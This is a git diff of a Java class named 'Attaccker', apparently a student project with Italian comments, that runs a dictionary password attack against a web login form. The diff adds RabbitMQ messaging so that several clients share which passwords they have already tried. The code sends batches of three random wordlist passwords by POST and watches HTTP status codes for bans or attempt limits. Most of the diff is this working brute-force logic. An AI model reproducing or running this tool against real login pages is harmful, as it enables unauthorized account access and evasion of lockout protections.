@@ -11,10 +11,22 @@ import java.net.URL;
 import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Random;
+import java.util.concurrent.TimeoutException;
+
 import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
 import org.jsoup.nodes.Element;
 import org.jsoup.select.Elements;
+
+import com.rabbitmq.client.AMQP;
+import com.rabbitmq.client.BuiltinExchangeType;
+import com.rabbitmq.client.Channel;
+import com.rabbitmq.client.Connection;
+import com.rabbitmq.client.ConnectionFactory;
+import com.rabbitmq.client.Consumer;
+import com.rabbitmq.client.DefaultConsumer;
+import com.rabbitmq.client.Envelope;
 
 public class Attaccker {
 
@@ -25,19 +37,47 @@ public class Attaccker {
 	private String url;
 	private String login;
 	private String dictonary;
-	private boolean passwFound = false;
-	private boolean ban = false;
-	private boolean attempts = false;
+	private boolean passwFound;
+	private boolean ban;
+	private boolean attempts;
 
-	private List<Integer> indexRecived = new ArrayList<Integer>(); // indici delle password ricevute da altri client
-	
-	private int index[] = new int[3]; // array che contiene gli indici delle password che verranno mandate tramite									// POST
+	private String exName;
+	private ConnectionFactory factory;
+	private Connection connection;
+	private Channel channel;
+	// private String message;
+	private String name;
+	private String queueName;
+	private String mexStr;
+
+	private ArrayList<String> indexRecived = new ArrayList<String>(); // indici delle password ricevute da altri client
+
+	private String passwToSend[] = new String[3]; // array che contiene gli indici delle password che verranno mandate
+													// tramite POST
 	private int response[] = new int[3]; // array che contiene gli stati http
 
-	public Attaccker(String url, String login, String dictonary) {
+	public Attaccker(String url, String login, String dictonary, String exName, String name)
+			throws IOException, TimeoutException {
+
 		this.url = url;
 		this.login = login;
 		this.dictonary = dictonary;
+		this.passwFound = false;
+		this.ban = false;
+		this.attempts = false;
+
+		this.exName = exName;
+		// this.message = message;
+		this.name = name;
+
+		factory = new ConnectionFactory();
+		factory.setHost("localhost");
+		connection = factory.newConnection();
+		this.channel = connection.createChannel();
+
+		this.channel.exchangeDeclare(this.exName, BuiltinExchangeType.FANOUT);
+		queueName = channel.queueDeclare().getQueue();
+		this.channel.queueBind(queueName, this.exName, "");
 
 	}
 
@@ -52,27 +92,16 @@ public class Attaccker {
 		// 1. Send a "GET" request, so that you can extract the form's data.
 		String page = this.GetPageContent(url);
 
-		String[] data = readDictonaryAttack(dictonary);
+		// String[] data = readDictonaryAttack(dictonary);
+		ArrayList<String> data = readDictonaryAttack(dictonary);
 
-		indexRecived.add(5);
-		indexRecived.add(9);
-		indexRecived.add(0);
-		indexRecived.add(33);
-		indexRecived.add(10);
-		indexRecived.add(38);
-		indexRecived.add(8);
-		indexRecived.add(17);
-		indexRecived.add(13);
-		indexRecived.add(20);
-		indexRecived.add(2);
-
-		index = setNewIndex(index, indexRecived, data);
+		passwToSend = setNewPasswToSend(indexRecived, data);
 
 		// 2. Construct above post's content and then send a POST request for
 		// authentication
 
 		for (int i = 0; i < 3; i++) {
-			String postParams = this.getFormParams(page, "prova", data[index[i]]);
+			String postParams = this.getFormParams(page, "prova", passwToSend[i]);
 			response[i] = this.sendPost(login, postParams);
 		}
 
@@ -94,13 +123,12 @@ public class Attaccker {
 				ban = true;
 			}
 		}
-
 	}
 
-	private String[] readDictonaryAttack(String path) throws IOException {
+	private ArrayList<String> readDictonaryAttack(String path) throws IOException {
 
 		String line = "";
-		List<String> lines = new ArrayList<String>();
+		ArrayList<String> lines = new ArrayList<String>();
 		BufferedReader bf = new BufferedReader(new FileReader(path));
 
 		while ((line = bf.readLine()) != null) {
@@ -108,23 +136,28 @@ public class Attaccker {
 		}
 		bf.close();
 
-		return lines.toArray(new String[] {});
+		return lines;
+		// return lines.toArray(new String[] {});
 
 	}
 
-	private int[] setNewIndex(int index[], List<Integer> indexRecived, String[] data) {
+	private String[] setNewPasswToSend(ArrayList<String> indexRecived, ArrayList<String> data) {
 
+		Random random = new Random();
+		// data.get(random.nextInt(data.size()));
 		// scelta indici random da dizionario
 
+		String[] passwords = new String[3];
 		for (int i = 0; i < 3; i++) {
 
-			index[i] = (int) (Math.random() * (data.length));
-			while (indexRecived.contains(index[i]))
-				index[i] = (int) (Math.random() * (data.length));
+			passwords[i] = data.get(random.nextInt(data.size()));
+			// index[i] = (int) (Math.random() * (data.length));
+			while (indexRecived.contains(passwords[i]))
+				passwords[i] = data.get(random.nextInt(data.size()));
 
 		}
 
-		return index;
+		return passwords;
 	}
 
 	private int sendPost(String url, String postParams) throws Exception {
@@ -249,12 +282,31 @@ public class Attaccker {
 		return result.toString();
 	}
 
-	private List<String> getCookies() {
-		return cookies;
-	}
-
 	private void setCookies(List<String> cookies) {
 		this.cookies = cookies;
+	}
+
+	private void sendMessage(String message) throws UnsupportedEncodingException, IOException {
+
+		this.channel.basicPublish(this.exName, "", null, message.getBytes("UTF-8"));
+		System.out.println(name + " MANDA: " + message);
+	}
+
+	public void receivedMessage() throws IOException, TimeoutException {
+
+		System.out.println(name + " Waiting for messages. To exit press CTRL+C");
+
+		Consumer consumer = new DefaultConsumer(channel) {
+			@Override
+			public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties,
+					byte[] body) throws IOException {
+				String mexReceived = new String(body, "UTF-8");
+				// System.out.println(name + " Received: " + mexReceived);
+				indexRecived.add(mexReceived);
+			}
+		};
+
+		this.channel.basicConsume(this.queueName, true, consumer);
 	}
 
 }
